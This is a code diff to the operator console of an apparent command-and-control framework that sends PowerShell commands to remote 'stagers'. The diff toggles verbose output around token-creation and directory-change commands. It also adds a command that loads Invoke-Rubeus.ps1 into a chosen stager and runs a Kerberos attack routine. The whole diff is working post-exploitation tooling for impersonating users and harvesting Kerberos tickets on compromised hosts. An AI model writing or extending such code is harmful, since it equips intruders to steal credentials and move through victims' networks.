@@ -584,6 +584,9 @@ class mymainclass():
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MAKETOKEN:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+                    
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -614,6 +617,9 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
@@ -734,6 +740,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_CD:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -751,6 +760,9 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_DOWNLOAD:
@@ -932,6 +944,30 @@ class mymainclass():
                     self.__t_myserver.set_verbose(True)
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_KERBER:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
+                    continue
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
